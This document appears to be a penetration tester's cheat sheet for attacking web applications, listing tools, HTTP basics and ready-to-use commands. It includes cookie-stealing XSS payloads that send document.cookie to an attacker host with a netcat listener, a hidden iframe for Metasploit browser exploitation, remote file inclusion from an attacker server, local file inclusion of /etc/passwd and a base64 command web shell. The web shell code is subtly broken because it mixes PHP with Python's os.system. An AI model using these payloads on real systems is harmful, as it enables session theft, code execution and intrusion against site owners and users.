Web Apps


# Firefox plugins

Cookies Manager+
Live HTTP Header (clone)
Proxy Switcher
User-Agent Switcher
------------------------------------------------------------------------------------------------------

# Request Methods

GET  Passes all query material in the URL query string.
POST Passes all requested data in the HTTP request body.
------------------------------------------------------------------------------------------------------

# HTTP Status Codes

1xx  Informational
100  Continue

2xx  Success
200  OK

3xx  Redirection
301  Moved Permanently
302  Found

4xx  Client Error
400  Bad Request
401  Unauthorized
403  Forbidden
404  Not Found
408  Request Timeout

5xx  Server Error
500  Internal Server Error
------------------------------------------------------------------------------------------------------

# Simple web server to share malicious code

Change directory to where your scripts and web shells are located.
cd /root/scripts/
python -m SimpleHTTPServer 80
------------------------------------------------------------------------------------------------------

# Apache version, eTag, HTTP Basic Authentication Enabled

telnet <target IP> 80
HEAD / HTTP/1.0
(hit enter 2x)

for i in `cat 80.txt` ; do curl -iskXHEAD http://$i/ > $i 2>&1 ; echo Scanned $i ; done
------------------------------------------------------------------------------------------------------

# Browser Redirection

<iframe SRC="http://attackerIP/report" height = "0" width ="0">
hacker:  use Metasploit browser autopwn listening on hackerip
------------------------------------------------------------------------------------------------------

# Cisco Router

x is between 15 and 99.
https://targetIP/level/x/exec/-/show
------------------------------------------------------------------------------------------------------

# Cookie Security Issues - missing HttpOnly or Secure attribute

HttpOnly - prevents JavaScript from accessing the cookie
Secure - only send over an encrypted channel

Firefox
Cookies > View Cookie Information
HttpOnly cookie tells the browser if a Java scripts tries to access the cookie, the browser should not return a value.

for i in `cat 80.txt` ; do curl -iskXHEAD http://$i/ > $i 2>&1 ; echo Scanned $i ; done
------------------------------------------------------------------------------------------------------

# Cookie Stealing

<script>new Image().src="http://attackerIP/test.php?"+ document.cookie;</script>
hacker:  nc -lvp 80
------------------------------------------------------------------------------------------------------

# File upload vuln

Create a php file called evil.php 
<?php
$cmd=$_GET["cmd"];
$decode=base64_decode($cmd);
os.system($decode);
?>

Once the malicious file is in place, pass base64 encoded commands to it, and get basic code execution on the web server, as the "apache" user.

wget -O output -o /dev/null www.target.com/photos/evil.php?cmd=$(echo id|base64)
cat output

wget -O output -o /dev/null www.target.com/photos/evil.php?cmd=$(echo ifconfig|base64)
cat output
------------------------------------------------------------------------------------------------------

# Fuzzing

When fuzzing headers, disable URL Encode.
When you are inside of a POST parameter, always use URL encoding.
------------------------------------------------------------------------------------------------------

# Headers

curl -i -X targetURL
------------------------------------------------------------------------------------------------------

# Local file inclusion

http://localhost/index.php?page=/etc/passwd
------------------------------------------------------------------------------------------------------

# PHP version

telnet <target IP> 80
GET / HEAD/1.0

http://target IP/aaaaa.php

Firefox > Web Developer Toolbar > Information > View Response Headers
------------------------------------------------------------------------------------------------------

# Remote File Inclusion

http://target IP/index.php?page=http://attackerIP/evil.txt
------------------------------------------------------------------------------------------------------

# TRACE / TRACK methods allowed

telnet <target IP> 80
OPTIONS / HTTP/1.0
(hit enter 2x)

Check for cross-site tracing (XST)
curl -X TRACE <target IP>
curl -X TRACE -H "Cookie: name=value" <target>
------------------------------------------------------------------------------------------------------

# URL Encoding

%20       space
%40   @   at
%26   &   ampersand
%28   (   open parenthesis
%29   )   close parenthesis
%3B   ;   semicolon
%22   "   double quote
%27   '   single quote
%3C   <   less than
%3E   >   greater than
%2E   .   period
%2F   /   forward slash

Example: <script>alert(document.cookie);</script>
Encoded: %3Cscript%3Ealert%28document%2Ecookie%29%3B%3C%2Fscript%3E
------------------------------------------------------------------------------------------------------

# WebDAV extensions are enabled

msfconsole
use auxiliary/scanner/http/webdav_scanner

./davtest.pl -url http://target-IP

for i in $(cat 80.txt); do cadaver -t $i; done
------------------------------------------------------------------------------------------------------

# WordPress

wpscan -u www.target.com -e u vp vt -r

cd /usr/share/wpscan/
stop_user_enumeration_bypass.rb www.target.com --ids 1-1000
------------------------------------------------------------------------------------------------------

# XML Injection

Single quote         foo'
Double quote         foo"
Greater than         foo>
Less than            foo<			
Comment tag          foo<!--
Ampersand            &foo
------------------------------------------------------------------------------------------------------

# XSS

Stored - example: guestbook
<script>alert("XSS");</script>
<script>alert(document.cookie);</script>
<iframe SRC="http://attackerIP" height="0" width="0"></iframe>
<script>new Image().src="http://attakerIP/test.php?output="+document.cookie;</script>

curl http://target.com/login.php?user=`perl â€“e 'print "a" x 500'`
------------------------------------------------------------------------------------------------------

# External How-To

http://bughunting.guide/a-gentle-introduction-to-cross-site-scripting-xss/
http://bughunting.guide/discovering-xss-vulnerabilities-with-burp-intruder/
https://nvisium.com/blog/2014/01/31/accurate-xss-detection-with-burpsuite/
https://forum.bugcrowd.com/t/tutorial-injectx-to-find-xss/790
